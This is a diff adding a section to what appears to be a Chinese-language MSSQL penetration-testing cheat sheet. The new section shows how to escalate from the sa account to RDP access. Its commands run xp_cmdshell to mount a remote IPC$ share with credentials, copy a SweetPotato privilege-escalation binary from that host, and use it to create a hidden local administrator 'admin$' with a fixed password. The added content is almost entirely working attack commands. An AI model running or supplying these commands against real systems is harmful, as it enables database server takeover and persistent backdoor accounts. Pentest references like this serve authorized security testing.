@@ -385,6 +385,16 @@ Exec master.dbo.sp_addextendedproc 'xp_cmdshell','c:\\xplog70.dll';
 exec xp_cmdshell 'whoami';
 ```
 
+**sa提权登RDP**
+
+```bash
+exec xp_cmdshell 'net use \\192.168.10.133\ipc$ mcc5@133 /user:192.168.10.133\administrator&& copy \\192.168.10.133\c$\users\public\videos\sweetpotato.exe c:\users\public\videos\s.exe'
+
+exec xp_cmdshell 'c:\users\public\videos\s.exe -a "whoami"'
+
+exec xp_cmdshell 'c:\users\public\videos\s.exe -a "net user admin$ @admin.886 /add&net localgroup administrators admin$ /add"'
+```
+
 **二、SP_OACreate** 
 
 > **适用(xp\2000\2003系统)**
